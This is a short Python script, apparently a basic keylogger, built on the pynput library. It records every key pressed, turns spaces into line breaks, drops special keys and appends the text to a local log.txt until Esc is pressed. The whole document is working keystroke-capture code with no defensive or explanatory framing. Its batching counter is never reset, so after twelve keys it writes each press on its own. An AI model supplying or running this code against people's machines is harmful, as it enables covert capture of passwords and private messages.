from pynput.keyboard import Key, Listener

count, keys = 0, []


def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count >= 12:
        write_to_file(keys)
        keys = []


def write_to_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
